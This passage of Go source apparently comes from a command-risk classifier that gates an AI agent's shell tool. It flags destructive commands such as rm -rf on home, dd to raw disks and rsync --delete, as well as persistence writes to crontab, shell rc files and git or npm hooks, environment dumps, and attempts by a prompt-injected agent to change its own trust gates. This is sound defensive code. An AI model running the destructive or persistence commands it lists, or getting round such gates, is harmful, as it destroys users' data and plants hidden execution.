	// stay verbatim and fail the caller's stat.
	path = expandEnvVars(path)
	return path
}

// expandTilde expands a leading tilde-prefix as a shell does: `~` and `~/` are
// the caller's home, `~+` and `~-` the current and previous working
// directory, and `~name` is name's home directory. A name that does not
// resolve keeps failing closed: it is mapped to /home/<name>, so a startup
// file under it still matches the other-account home rules instead of
// silently becoming a path under the caller's own home. Anything else (a
// tilde-prefix with quoting or expansion characters) is returned unchanged.
func expandTilde(path string) string {
	if !strings.HasPrefix(path, "~") {
		return path
	}
	prefix, rest, _ := strings.Cut(path[1:], "/")
	if rest != "" || strings.HasSuffix(path, "/") {
		rest = "/" + rest
	}
	switch prefix {
	case "":
		if home, _ := os.UserHomeDir(); home != "" {
			return home + rest
		}
		return path
	case "+":
		if cwd, err := os.Getwd(); err == nil {
			return cwd + rest
		}
		return path
	case "-":
		if old := os.Getenv("OLDPWD"); old != "" {
			return old + rest
		}
		return path
	}
	if !isLoginName(prefix) {
		return path
	}
	if u, err := user.Lookup(prefix); err == nil && u.HomeDir != "" {
		return u.HomeDir + rest
	}
	return "/home/" + prefix + rest
}

// isLoginName reports whether s is shaped like an account name, the only
// tilde-prefix a shell resolves to a home directory.
func isLoginName(s string) bool {
	if s == "" || strings.Contains(s, "..") {
		return false
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9', c == '_':
		case (c == '.' || c == '-') && i > 0:
		default:
			return false
		}
	}
	return true
}

// expandEnvVars replaces $VAR and ${VAR} occurrences with their values from
// the process environment when set; unset or malformed references are left
// verbatim.
func expandEnvVars(path string) string {
	if !strings.Contains(path, "$") {
		return path
	}
	var b strings.Builder
	b.Grow(len(path))
	for i := 0; i < len(path); {
		if path[i] != '$' {
			b.WriteByte(path[i])
			i++
			continue
		}
		rest := path[i:]
		if strings.HasPrefix(rest, "${") {
			if end := strings.IndexByte(rest, '}'); end > 2 {
				if v, ok := os.LookupEnv(rest[2:end]); ok {
					b.WriteString(v)
					i += end + 1
					continue
				}
			}
			// Malformed or unset — verbatim '$', rescan as plain text.
			b.WriteByte('$')
			i++
			continue
		}
		// $VAR form: longest [0-9A-Za-z_] run.
		j := 1
		for j < len(rest) && isShellVarByte(rest[j]) {
			j++
		}
		if j > 1 {
			if v, ok := os.LookupEnv(rest[1:j]); ok {
				b.WriteString(v)
				i += j
				continue
			}
		}
		b.WriteByte('$')
		i++
	}
	return b.String()
}

func isShellVarByte(c byte) bool {
	return c == '_' || (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

// destinationCommands copy or link their source operands to a destination;
// when that destination is a directory each source lands as <dir>/<basename>.
var destinationCommands = map[string]bool{
	"cp": true, "mv": true, "install": true, "ln": true, "rsync": true,
}

// destValueShortOpts lists, per command, the short options that consume a
// value (the rest of their word, or the next word).
var destValueShortOpts = map[string]string{
	"cp": "St", "mv": "St", "ln": "St", "install": "mogSt",
	"rsync": "efBMT@",
}

// destValueLongOpts lists the long options (without the leading dashes) that
// consume a value.
var destValueLongOpts = map[string][]string{
	"cp":      {"suffix", "target-directory", "sparse"},
	"mv":      {"suffix", "target-directory"},
	"ln":      {"suffix", "target-directory"},
	"install": {"mode", "owner", "group", "suffix", "target-directory", "strip-program", "context"},
	"rsync": {"rsh", "rsync-path", "exclude", "exclude-from", "include", "include-from", "filter",
		"files-from", "log-file", "log-file-format", "backup-dir", "suffix", "partial-dir", "temp-dir",
		"compare-dest", "copy-dest", "link-dest", "port", "bwlimit", "timeout", "contimeout", "max-size",
		"min-size", "chmod", "chown", "usermap", "groupmap", "out-format", "info", "debug", "remote-option",
		"config", "address", "sockopts", "password-file", "read-batch", "write-batch", "only-write-batch",
		"block-size", "max-delete", "modify-window", "checksum-seed", "iconv", "protocol", "stop-after",
		"stop-at", "early-input", "outbuf", "compress-level", "compress-choice", "skip-compress"},
}

// maxDestSourceEntries bounds how many directory entries a source directory
// contributes when its contents (not the directory itself) land at the
// destination.
const maxDestSourceEntries = 1024

// writeDestinations returns the filesystem paths a cp/mv/install/ln/rsync
// invocation writes to: the destination operand (or -t/--target-directory
// value) and, when the destination is a directory, <dir>/<basename> for every
// source -- the file that actually lands. Paths are tilde/variable expanded.
// For rsync only the final local operand is a destination. Classification
// that looked only at the literal operands would see `cp x .git/hooks/` or
// `mv .bashrc ~/` as plain writes into a directory.
func writeDestinations(first string, tokens []string) []string {
	if !destinationCommands[first] || len(tokens) < 2 {
		return nil
	}
	shortVal := destValueShortOpts[first]
	longVal := destValueLongOpts[first]
	targetShort := first != "rsync"
	var targetDir string
	hasTarget, noTarget := false, false
	var operands []string
	endOpts := false
	for i := 1; i < len(tokens); i++ {
		tok := tokens[i]
		if endOpts || tok == "" || tok == "-" || !strings.HasPrefix(tok, "-") {
			operands = append(operands, tok)
			continue
		}
		if tok == "--" {
			endOpts = true
			continue
		}
		if strings.HasPrefix(tok, "--") {
			name, val, hasVal := strings.Cut(tok, "=")
			if first != "rsync" && len(name) >= 3 && strings.HasPrefix("--no-target-directory", name) && len(name) >= 5 {
				noTarget = true
				continue
			}
			full := ""
			for _, opt := range longVal {
				if name == "--"+opt || (first != "rsync" && len(name) >= 4 && strings.HasPrefix("--"+opt, name)) ||
					(opt == "target-directory" && first != "rsync" && len(name) >= 3 && strings.HasPrefix("--"+opt, name)) {
					full = opt
					break
				}
			}
			if full == "" {
				continue
			}
			if !hasVal && i+1 < len(tokens) {
				i++
				val = tokens[i]
			}
			if full == "target-directory" {
				targetDir, hasTarget = val, true
			}
			continue
		}
		for j := 1; j < len(tok); j++ {
			c := tok[j]
			if targetShort && c == 'T' {
				noTarget = true
			}
			if strings.IndexByte(shortVal, c) < 0 {
				continue
			}
			val := tok[j+1:]
			if val == "" && i+1 < len(tokens) {
				i++
				val = tokens[i]
			}
			if c == 't' && targetShort {
				targetDir, hasTarget = val, true
			}
			break
		}
	}

	var dests, sources []string
	dirDest := false
	switch {
	case hasTarget:
		dests, sources, dirDest = []string{targetDir}, operands, true
	case first == "rsync":
		// The last non-flag word is the destination; also consider the last
		// word overall, in case an option value was mistaken for an operand.
		if len(operands) < 2 {
			return nil
		}
		dests = []string{operands[len(operands)-1]}
		sources = operands[:len(operands)-1]
		for k := len(tokens) - 1; k >= 1; k-- {
			if last := tokens[k]; last != "" && !strings.HasPrefix(last, "-") {
				if last != dests[0] {
					dests = append(dests, last)
				}
				break
			}
		}
	case len(operands) >= 2:
		dests, sources = []string{operands[len(operands)-1]}, operands[:len(operands)-1]
	default:
		return nil
	}

	var out []string
	for _, dest := range dests {
		if first == "rsync" && isRemoteRsyncOperand(dest) {
			continue
		}
		expanded := expandShellTokenPath(dest)
		out = append(out, expanded)
		if !dirDest && !noTarget {
			dirDest = isDirectoryDestination(dest, expanded)
		}
		if !dirDest {
			continue
		}
		for _, src := range sources {
			for _, name := range destinationEntryNames(first, src) {
				out = append(out, filepath.Join(expanded, name))
			}
		}
	}
	return out
}

// isRemoteRsyncOperand reports whether an rsync operand names a remote host
// (host:path, host::module, rsync://...) rather than a local path.
func isRemoteRsyncOperand(op string) bool {
	if strings.HasPrefix(op, "rsync://") || strings.Contains(op, "::") {
		return true
	}
	colon := strings.IndexByte(op, ':')
	return colon > 0 && !strings.Contains(op[:colon], "/")
}

// isDirectoryDestination reports whether a destination operand denotes a
// directory: spelled with a trailing slash, `.`/`..`, the caller's home, or
// an existing directory.
func isDirectoryDestination(raw, expanded string) bool {
	if strings.HasSuffix(raw, "/") || strings.HasSuffix(expanded, "/") {
		return true
	}
	switch filepath.Base(expanded) {
	case ".", "..":
		return true
	}
	// The caller's home is a directory whether or not it can be statted (a
	// service account's HOME may be absent or sit behind a symlink).
	for _, home := range currentHomeDirs() {
		if filepath.Clean(expanded) == home {
			return true
		}
	}
	if st, err := os.Stat(expanded); err == nil && st.IsDir() {
		return true
	}
	return false
}

// destinationEntryNames returns the names a source operand contributes inside
// a destination directory: its basename, or -- when the operand means "the
// contents" (`dir/.`, an rsync `dir/`) -- the names of the entries it holds.
// A dot-glob such as `.b*` contributes the startup-file names it can match.
func destinationEntryNames(first, src string) []string {
	if first == "rsync" && isRemoteRsyncOperand(src) {
		_, src, _ = strings.Cut(src, ":")
	}
	expanded := expandShellTokenPath(src)
	contents := strings.HasSuffix(expanded, "/.") || (first == "rsync" && strings.HasSuffix(expanded, "/"))
	trimmed := strings.TrimRight(expanded, "/")
	if contents || filepath.Base(trimmed) == "." || filepath.Base(trimmed) == ".." {
		entries, err := os.ReadDir(strings.TrimSuffix(trimmed, "/."))
		if err != nil {
			return nil
		}
		var names []string
		for _, e := range entries {
			if len(names) >= maxDestSourceEntries {
				break
			}
			names = append(names, e.Name())
		}
		return names
	}
	base := filepath.Base(trimmed)
	if base == "" || base == "/" {
		return nil
	}
	if strings.HasPrefix(base, ".") && strings.ContainsAny(base, "*?[") {
		var names []string
		for name := range shellRCFiles {
			if ok, _ := filepath.Match(base, name); ok {
				names = append(names, name)
			}
		}
		for name := range persistenceBaseNames {
			if ok, _ := filepath.Match(base, name); ok {
				names = append(names, name)
			}
		}
		return names
	}
	return []string{base}
}

// isPersistenceWrite reports whether a shell command writes to a
// deferred-execution target or mutates a package-manager lifecycle hook
// . Checked before isSystemWrite so persistence targets keep their
// distinct, never-trust-shortcut class.
func isPersistenceWrite(first string, tokens []string) bool {
	// crontab: anything other than a pure listing installs/replaces the
	// user's crontab — `crontab file`, `crontab -`, `(crontab -l; echo …) |
	// crontab -` all persist a scheduled job.
	if first == "crontab" {
		for _, tok := range tokens[1:] {
			if tok != "-l" && tok != "--list" && tok != "--help" && tok != "--version" {
				return true
			}
		}
		return false
	}
	// git maintenance start/register install a recurring background job
	// (crontab entry, launchd plist, or systemd user timers).
	if first == "git" {
		if sub, args := gitSubcommandAndArgs(tokens); sub == "maintenance" && len(args) > 0 && (args[0] == "start" || args[0] == "register") {
			return true
		}
	}
	// Redirect targets: `echo hook >> ~/.zshrc`, `printf x > .envrc`.
	for i, tok := range tokens {
		if isRedirectToken(tok) && i+1 < len(tokens) && IsPersistencePath(expandShellTokenPath(tokens[i+1])) {
			return true
		}
	}
	// Write-command operands: `cp x .git/hooks/pre-commit`,
	// `mv y ~/.config/systemd/user/evil.service`.
	if (writePrefixes[first] && !commandOnlyReads(first, tokens)) || first == "ln" || first == "install" {
		for _, tok := range tokens[1:] {
			if IsPersistencePath(expandShellTokenPath(tok)) {
				return true
			}
		}
	}
	// Directory destinations: the file that lands is <dir>/<basename(src)>.
	for _, dest := range writeDestinations(first, tokens) {
		if IsPersistencePath(dest) {
			return true
		}
	}
	// dd of= writes its output to an arbitrary path.
	if first == "dd" {
		for _, tok := range tokens {
			if strings.HasPrefix(strings.ToLower(tok), "of=") && IsPersistencePath(expandShellTokenPath(tok)) {
				return true
			}
		}
	}
	// npm lifecycle-script mutation: `npm set-script <hook> …` always
	// installs an install-time hook; `npm pkg set scripts.<hook>=…` only
	// when the key sits under scripts.
	if first == "npm" {
		for i := 1; i < len(tokens); i++ {
			lt := strings.ToLower(tokens[i])
			if lt == "set-script" {
				return true
			}
			if lt == "pkg" {
				if hasAny(tokens[i+1:], "set", "delete") && strings.Contains(strings.ToLower(strings.Join(tokens[i+1:], " ")), "scripts") {
					return true
				}
			}
		}
	}
	// jq rewriting package.json scripts: `jq '.scripts.preinstall=…' package.json`.
	if first == "jq" {
		joined := strings.ToLower(strings.Join(tokens, " "))
		if strings.Contains(joined, ".scripts") && strings.Contains(joined, "package.json") && regexp.MustCompile(`(?:\|=|[+*/-]?=)`).MatchString(joined) {
			return true
		}
	}
	return false
}

// shellPathIsSensitive reports whether a shell token names a path that should
// be treated as system_write or worse. It is used for both write operands and
// general path arguments so reads of rc files and trust anchors are gated.
func shellPathIsSensitive(tok string) bool {
	cls := classifyShellTokenPath(tok)
	return Rank(cls) >= Rank(SystemWrite)
}

// shellPathIsHomeSensitive reports whether a shell token names a path under
// the user's home directory that ClassifyPath considers system_write or worse
// (e.g. ~/.bashrc, ~/.ssh/id_rsa, ~/.odek/config.json). It is narrower than
// shellPathIsSensitive so that touching /etc itself does not break the existing
// classification of commands like `cd /etc`.
func shellPathIsHomeSensitive(tok string) bool {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return false
	}
	path := tok
	for _, prefix := range []string{"of=", "if="} {
		if strings.HasPrefix(strings.ToLower(path), prefix) {
			path = path[len(prefix):]
			break
		}
	}
	if path == "" {
		return false
	}
	if strings.HasPrefix(path, "~") {
		path = expandTilde(path)
	} else if path == "$HOME" || strings.HasPrefix(path, "$HOME/") {
		path = home + path[len("$HOME"):]
	} else if path == "${HOME}" || strings.HasPrefix(path, "${HOME}/") {
		path = home + path[len("${HOME}"):]
	}
	abs, err := absPath(path)
	if err != nil {
		return false
	}
	abs = filepath.Clean(abs)
	// Case-fold the home-prefix comparison: on case-insensitive filesystems
	// (macOS APFS, Windows NTFS) /USERS/x/.gitconfig names the same file as
	// /Users/x/.gitconfig, and an exact-case prefix match would let a case
	// variant slip past the guard. Mirrors the folded comparisons its peers
	// apply in ClassifyPath and IsPersistencePath.
	lowerAbs, lowerHome := strings.ToLower(abs), strings.ToLower(home)
	if lowerAbs != lowerHome && !strings.HasPrefix(lowerAbs, lowerHome+"/") {
		return false
	}
	return Rank(ClassifyPath(abs)) >= Rank(SystemWrite)
}

// ── Small token helpers ────────────────────────────────────────────────

// commandName returns the program name from a token, taking the basename of
// absolute/relative paths so /bin/bash, /usr/bin/sudo and ./rm resolve to
// their command name for prefix matching.
func commandName(tok string) string {
	if strings.Contains(tok, "/") {
		return filepath.Base(tok)
	}
	return tok
}

// worstOf returns whichever class ranks higher (more severe).
func worstOf(a, b RiskClass) RiskClass {
	if Rank(b) > Rank(a) {
		return b
	}
	return a
}

// shellHasOperand reports whether a shell-interpreter invocation has a
// non-flag, non-redirect operand — i.e. a script file or process
// substitution it will execute. Bare `bash` / `sh` (interactive) has none.
func shellHasOperand(tokens []string) bool {
	for _, t := range tokens[1:] {
		if t == "" || t == "<" || isRedirectToken(t) {
			continue
		}
		if !strings.HasPrefix(t, "-") {
			return true
		}
	}
	return false
}

// shellInlineScriptIndex returns the index of the inline script of a shell
// invocation (`bash -c SCRIPT`), or -1 when the invocation has none. tokens[0]
// is the shell itself. Any short-flag cluster containing `c` (-c, -lc, -ec,
// -xc, -ce) selects inline mode; the script is then the first operand, so
// value-taking shell options (-o NAME, -O NAME, --rcfile FILE, --init-file
// FILE) and `--` are honoured instead of being mistaken for the script.
// Redirections ahead of the script are skipped with their targets.
func shellInlineScriptIndex(tokens []string) int {
	sawC := false
	for i := 1; i < len(tokens); i++ {
		t := tokens[i]
		switch {
		case t == "--":
			if sawC && i+1 < len(tokens) {
				return i + 1
			}
			return -1
		case isRedirectToken(t):
			i++ // skip the redirect target
		case strings.HasPrefix(t, "--"):
			if t == "--rcfile" || t == "--init-file" {
				i++
			}
		case len(t) > 1 && (t[0] == '-' || t[0] == '+'):
			for _, r := range t[1:] {
				switch r {
				case 'c':
					if t[0] == '-' {
						sawC = true
					}
				case 'o', 'O':
					i++ // option name follows as its own token
				}
			}
		default:
			if sawC {
				return i
			}
			return -1
		}
	}
	return -1
}

// shellInlineScript returns the inline `-c` script of a shell invocation, or
// "" when there is none.
func shellInlineScript(tokens []string) string {
	if i := shellInlineScriptIndex(tokens); i >= 0 {
		return tokens[i]
	}
	return ""
}

// hasAny reports whether any token equals one of names.
func hasAny(tokens []string, names ...string) bool {
	for _, t := range tokens {
		for _, n := range names {
			if t == n {
				return true
			}
		}
	}
	return false
}

// rsyncDeleteFlags are flags that cause rsync to delete files on the
// destination or remove them from the source — unrecoverable bulk deletion.
func hasAnyRsyncDelete(tokens []string) bool {
	for _, t := range tokens {
		if strings.HasPrefix(t, "--delete") {
			return true
		}
		switch t {
		case "--del", "--remove-source-files", "--remove-sent-files":
			return true
		}
	}
	return false
}

// isAssignment reports whether a token is a NAME=VALUE shell assignment
// (used to skip `env FOO=bar … cmd`). A leading-slash token like
// /a=b is a path, not an assignment.
func isAssignment(tok string) bool {
	eq := strings.IndexByte(tok, '=')
	if eq <= 0 || strings.HasPrefix(tok, "/") {
		return false
	}
	for _, r := range tok[:eq] {
		if r != '_' && (r < 'A' || r > 'Z') && (r < 'a' || r > 'z') && (r < '0' || r > '9') {
			return false
		}
	}
	return true
}

// isNumericish reports whether a token looks like a count or duration
// (5, 0.5, 10s, 2m) — the kind of argument timeout/nice take before the
// command they wrap.
func isNumericish(tok string) bool {
	return reNumericish.MatchString(tok)
}

var reNumericish = regexp.MustCompile(`^[0-9]+(\.[0-9]+)?[smhd]?$`)

// classifyCommand classifies a single command (no separators, no pipes).
// Wrapper stripping and pipe/segment handling happen in the callers.
func classifyCommand(tokens []string, repo *gitRepoCtx) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}
	cls := classifyKnownCommand(tokens, repo)
	name := commandName(tokens[0])
	if !isKnownCommandName(name) && !specialCommandNames[name] {
		cls = worstOf(cls, Unknown)
	}
	if explicitUntrustedExecutable(tokens[0]) {
		cls = worstOf(cls, CodeExecution)
	}
	return cls
}

// manRunsProgram reports whether man options name a program to execute: the
// pager (-P PROG, fused -PPROG or inside a cluster, --pager[=PROG] and its
// unambiguous abbreviations) or the HTML browser (-H, --html).
func manRunsProgram(args []string) bool {
	for _, a := range args {
		switch {
		case a == "--":
			return false
		case strings.HasPrefix(a, "--"):
			name, _, _ := strings.Cut(a[2:], "=")
			if len(name) >= 3 && (strings.HasPrefix("pager", name) || strings.HasPrefix("html", name)) {
				return true
			}
		case isShortFlagToken(a):
			if strings.ContainsAny(a[1:], "PH") {
				return true
			}
		}
	}
	return false
}

func classifyKnownCommand(tokens []string, repo *gitRepoCtx) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}

	// Resolve the program name from its basename so /bin/rm, /usr/bin/curl
	// and ./sh classify the same as their bare names in any pipe stage.
	first := commandName(tokens[0])

	// Environment dumps are equivalent to reading the process's credential
	// store; they are never safe even when used benignly.
	if first == "printenv" && printenvDumpsAll(tokens) {
		return SystemWrite
	}

	// man runs the -P/--pager value through `sh -c` (and -H/--html launches a
	// browser command); the MANPAGER spelling is already escalated as an
	// environment assignment, so the flag spelling is code execution too.
	if first == "man" && manRunsProgram(tokens[1:]) {
		return CodeExecution
	}

	// odek self-invocations can reach human-gated trust mutations (`odek memory
	// promote`, `odek memory extended confirm`, `odek skill promote --force`).
	// Treating the whole binary as system_write prevents a prompt-injected agent
	// from using the shell tool to flip its own taint gates.
	if first == "odek" {
		return SystemWrite
	}

	// Blocked
	if isBlocked(tokens) {
		return Blocked
	}

	// A non-static $(…)/`…` expansion in a mutating command is the same
	// threat as `cat file | xargs rm`: the real path is unknowable, so
	// fail closed. Static `$(echo /)` is inlined by substValue first.
	if hasDynamicSubst(tokens) && xargsDangerousVerb(first) {
		return Unknown
	}

	// Destructive
	if isDestructive(first, tokens) {
		return Destructive
	}

	// Persistence: writes aimed at deferred-execution targets.
	// Checked before SystemWrite so shell-profile and hook writes keep the
	// distinct persistence class instead of collapsing into system_write.
	if isPersistenceWrite(first, tokens) {
		return Persistence
	}

	// System write
	if isSystemWrite(first, tokens) {
		return SystemWrite
	}

	// Irreversible git data-loss verbs (clean -f, reset --hard, checkout --,
	// restore, branch -D, stash drop/clear, reflog expire) destroy uncommitted
	// work or delete history with no undo. They were previously classified
	// Safe because git is a "network" command whose non-remote subcommands
	// fell through every check — a prompt-injection payload could wipe a
	// working tree with zero friction. They now require explicit approval
	// (system_write → prompt by default), like other irreversible mutations.
	if first == "git" && (isGitDataLoss(tokens) || gitRetargetsFilesystem(tokens)) {
		return SystemWrite
	}

	// git submodule foreach runs an arbitrary inner command in every
	// submodule; classify that command, not the outer git verb.
	if first == "git" {
		if inner := gitSubmoduleForeachInner(tokens); inner != "" {
			return CodeExecution
		}
	}

	// docker / docker-compose: inspect stays safe, run/build executes
	// image code, pull is egress, prune/image+volume rm is hard to undo.
	// Unrecognised verbs stay unknown (deny), matching fail-closed.
	if first == "docker" || first == "docker-compose" || first == "podman" || first == "nerdctl" {
		return classifyContainerCLI(first, tokens)
	}
	if first == "direnv" {
		return classifyDirenv(tokens)
	}
	if first == "gh" {
		return classifyGH(tokens)
	}
	if first == "kubectl" || first == "helm" || first == "terraform" {
		return classifyInfraCLI(first, tokens)
	}
	if first == "hugo" {
		return classifyHugo(tokens)
	}
	if first == "aws" || first == "gcloud" || first == "az" || first == "gsutil" {
		if networkInfoQuery(tokens) {
			return Safe
		}
		// Only the narrow local-to-object-store upload forms are classified;
		// every other subcommand keeps failing closed.
		if cloudUploadForm(first, tokens[1:]) {
			return NetworkUpload
		}
		return Unknown
	}

	// Code execution checks (pipe to shell, eval, -e/-c flags)
	if isCodeExecution(first, tokens, repo) {
		return CodeExecution
	}

	// Network egress
	if isNetworkEgress(first, tokens) {
		return NetworkEgress
	}

	// Install
	if isInstall(first, tokens) {
		return Install
	}

	// Local write
	if isLocalWrite(first, tokens) {
		return LocalWrite
	}

	// Any argument that names a system path (read or write) — broader than
	// isSystemWrite's redirect-only check above, which runs earlier so a
	// redirect to a system path beats the LocalWrite classification.
	// Display verbs without a redirect only print the string; they do not
	// open it (`echo /etc/passwd` is Safe, `cat /etc/shadow` is not).
	if !displayVerbs[first] && touchesSystemPath(tokens[1:]) {
		return SystemWrite
	}
	if displayVerbs[first] && stageHasOutputRedirect(tokens) && touchesSystemPath(tokens[1:]) {
		return SystemWrite
	}

	// Fail closed: a recognised command used benignly is Safe; an
	// unrecognised verb is Unknown (deny-by-default). An empty token slice
	// (e.g. an assignment-only command after unwrapping) is Safe.
	if len(tokens) == 0 || isKnownCommandName(first) {
		return Safe
	}
	return Unknown
}

// ── Detection helpers ──────────────────────────────────────────────────

// blockDevicePrefixes are raw disk device paths. Writing to any of these
// (via dd of=, or a redirect) destroys a whole disk/partition.
var blockDevicePrefixes = []string{
	"/dev/sd", "/dev/nvme", "/dev/vd", "/dev/hd", "/dev/xvd",
	"/dev/mmcblk", "/dev/disk", "/dev/loop", "/dev/dm-",
	"/dev/md", "/dev/mapper/", "/dev/rdisk", "/dev/rsd", "/dev/nbd",
	"/dev/zram", "/dev/pmem", "/dev/sr", "/dev/mem", "/dev/kmem", "/dev/port",
}

// devicePathForms returns the spellings of a path value the kernel could end
// up opening: the value with `.`/`//` components cleaned (and `..` resolved
// the way the kernel does, after symlinks) so `/dev/./sda`, `/dev//sda` and
// `/dev/../dev/sda` name /dev/sda. An unresolvable value yields its lexical
// clean form only.
func devicePathForms(value string) []string {
	value = expandShellTokenPath(value)
	if !filepath.IsAbs(value) {
		return nil
	}
	forms := []string{filepath.Clean(value)}
	if resolved, err := resolvePathTarget(value); err == nil && resolved != forms[0] {
		forms = append(forms, resolved)
	}
	return forms
}

func isBlockDevice(path string) bool {
	for _, form := range devicePathForms(path) {
		for _, p := range blockDevicePrefixes {
			if strings.HasPrefix(form, p) {
				return true
			}
		}
	}
	return false
}

// isRawDevicePath reports whether a path value names anything under /dev that
// is not a stdio alias or discard device. Writing through such a node reaches
// a driver or a disk, so it is never a plain file write, whatever the node's
// name or spelling (`/dev/md0`, `/dev/./sda`, `/dev/s?a`).
func isRawDevicePath(path string) bool {
	value := expandShellTokenPath(path)
	if !filepath.IsAbs(value) {
		return false
	}
	if isDirectBenignDevice(value) {
		return false
	}
	for _, form := range devicePathForms(path) {
		if !strings.HasPrefix(form, "/dev/") || isBenignCharDevice(form) {
			continue
		}
		return true
	}
	return false
}

func isBlocked(tokens []string) bool {
	// A fully-specified dd write to a raw block device is unrecoverable and
	// blocked even in YOLO mode. A bare `dd if=… of=/dev/sda` (no other
	// operands) is still caught by isDestructive (deny-by-default but
	// overridable for legitimate disk imaging in godmode).
	if len(tokens) >= 4 && commandName(tokens[0]) == "dd" {
		for i, tok := range tokens {
			if strings.HasPrefix(tok, "of=") && containsBlockDevice(tok) {
				return true
			}
			// of= /dev/sda (value as a separate token)
			if tok == "of=" && i+1 < len(tokens) && isBlockDevice(tokens[i+1]) {
				return true
			}
		}
	}
	return false
}

func containsBlockDevice(tok string) bool {
	// Match only real block devices via prefix checks on the path value —
	// NOT any substring, so a regular file that merely lives under a
	// directory named like a device (e.g. of=/tmp/dev/sda) is not treated
	// as an unrecoverable raw-disk write.
	value := tok
	if idx := strings.Index(value, "="); idx >= 0 {
		value = value[idx+1:]
	}
	return isBlockDevice(value)
}

// rmRecursiveOrForce reports whether rm's flags include a recursive or force
// option, in any spelling: -r, -R, -f, combined (-rf, -fr, -rfv, -Rf),
// long (--recursive, --force, --no-preserve-root), or a shell default
// substitution whose default value is a flag string such as ${X:--rf}.
func rmRecursiveOrForce(tokens []string) bool {
	for _, tok := range tokens[1:] {
		switch tok {
		case "--recursive", "--force", "--no-preserve-root", "-R":
			return true
		}
		if strings.HasPrefix(tok, "--") {
			continue
		}
		if strings.HasPrefix(tok, "-") {
			for _, r := range tok[1:] {
				if r == 'r' || r == 'R' || r == 'f' {
					return true
				}
			}
		}
		// Fail closed on ${VAR:-<flags>} / ${VAR:--rf}: the shell expands
		// the default when VAR is unset, so a token that looks like a
		// substitution whose default contains rm flags executes as those flags.
		if strings.HasPrefix(tok, "${") && strings.Contains(tok, ":-") {
			if idx := strings.Index(tok, ":-"); idx >= 0 {
				defaultVal := tok[idx+2:]
				if strings.Contains(defaultVal, "-") && strings.ContainsAny(defaultVal, "rRf") {
					return true
				}
			}
		}
	}
	return false
}

// isWipeTarget reports whether an rm argument denotes a catastrophic target:
// any absolute path outside /tmp and /workspace, or a relative target that
// expands to the current/parent/home directory or a glob. A leading `./` is
// normalized so `rm -rf ./` and `rm -rf ./..` are caught the same as `.` and
// `..`.
func isWipeTarget(tok string) bool {
	if strings.HasPrefix(tok, "/") {
		// Clean resolves traversal (e.g. /tmp/../home → /home) so the /tmp
		// carve-out can only exempt paths that really live under tmp.
		cleaned := filepath.Clean(tok)
		if cleaned == "/" {
			return true
		}
		exempt := cleaned == "/tmp" || strings.HasPrefix(cleaned, "/tmp/") ||
			cleaned == "/workspace" || strings.HasPrefix(cleaned, "/workspace/")
		return !exempt
	}
	// Strip every leading `./` so `./` → `.`, `./..` → `..`, and
	// `././.` / `./././.` collapse to `.` (a single-prefix strip left
	// `././.` as `./.`, which missed the wipe-target match).
	for strings.HasPrefix(tok, "./") {
		tok = tok[2:]
		if tok == "" {
			return true
		}
	}
	// A trailing slash names the same directory ("$PWD/", "${HOME}/",
	// "~root/"), and residual quote characters do not change the target.
	tok = strings.Trim(tok, "\"'")
	if trimmed := strings.TrimRight(tok, "/"); trimmed != "" {
		tok = trimmed
	}
	switch tok {
	case "*", ".", "..", "~", "$HOME", "$PWD", "${HOME}", "${PWD}":
		return true
	}
	// Globs/expansions rooted at cwd/parent/home: ./*, ../, ~/, $HOME/*
	for _, p := range []string{"~/", "$HOME", "${HOME}", "../", "./*"} {
		if strings.HasPrefix(tok, p) {
			return true
		}
	}
	// `~name` is that account's home directory (`~root`, `~nobody`), `~+` and
	// `~-` the current and previous directory: every one is a home-level wipe.
	if strings.HasPrefix(tok, "~") {
		return true
	}
	// $PWD / ${PWD} followed by a path that cleans to the directory itself,
	// its parent, or a glob over it.
	for _, p := range []string{"$PWD/", "${PWD}/"} {
		if rest, ok := strings.CutPrefix(tok, p); ok {
			rest = filepath.Clean(rest)
			if rest == "." || rest == ".." || rest == "*" || strings.HasPrefix(rest, "../") {
				return true
			}
		}
	}
	return false
}

func isDestructive(first string, tokens []string) bool {
	// Machine power-control commands halt or reboot the host, killing the
	// agent's own session and any in-flight work. They are deny-by-default
	// (overridable in godmode) with an accurate label rather than the opaque
	// "unknown" they previously fell through to. init/telinit are only flagged
	// when given a halt/reboot/single-user runlevel, since bare `init` is rare
	// and a runlevel argument is what makes the call destructive.
	switch first {
	case "shutdown", "reboot", "halt", "poweroff":
		return true
	case "init", "telinit":
		return hasAny(tokens, "0", "6", "1", "s", "S")
	}

	// rm with a recursive/force flag aimed at a root path or a "wipe" target.
	if first == "rm" {
		if !rmRecursiveOrForce(tokens) {
			return false
		}
		for _, tok := range tokens[1:] {
			if isWipeTarget(tok) {
				return true
			}
		}
		return false
	}

	// shred permanently overwrites its targets — irreversible. Like rm, it is
	// only destructive when aimed at a raw block device or a catastrophic wipe
	// target (an absolute path outside the work/temp dirs, the home dir, etc.);
	// shredding a local working file falls through to local_write below.
	if first == "shred" {
		for _, tok := range tokens[1:] {
			if strings.HasPrefix(tok, "-") {
				continue
			}
			if isBlockDevice(tok) || isWipeTarget(tok) {
				return true
			}
		}
		return false
	}

	// find -delete removes every matched file; rsync --delete / --remove-source-files
	// can wipe a directory tree. Both are unrecoverable bulk deletion, equivalent to
	// rm -rf, so they classify as destructive.
	if first == "find" && hasAny(tokens, "-delete") {
		return true
	}
	if first == "rsync" && hasAnyRsyncDelete(tokens) {
		return true
	}
	// tar --remove-files deletes every archived source once it is written.
	if first == "tar" && tarOptions.parse(tokens[1:]).has("--remove-files") {
		return true
	}
	if first == "rsync" {
		for _, dest := range writeDestinations(first, tokens) {
			if ClassifyPath(dest) == Destructive {
				return true
			}
		}
	}

	if !destructivePrefixes[first] || len(tokens) < 2 {
		return false
	}

	// mkfs, fdisk, parted, etc. — any usage is destructive
	if first != "dd" {
		return len(tokens) >= 1
	}

	// dd writing to a raw block device (of=/dev/sda etc.) is destructive.
	// Match only real block devices via containsBlockDevice/isBlockDevice —
	// NOT any "/dev/" substring, so benign discards like of=/dev/null and
	// of=/dev/stdout are not misclassified.
	for _, tok := range tokens {
		if strings.HasPrefix(tok, "of=") && (containsBlockDevice(tok) || isRawDevicePath(tok)) {
			return true
		}
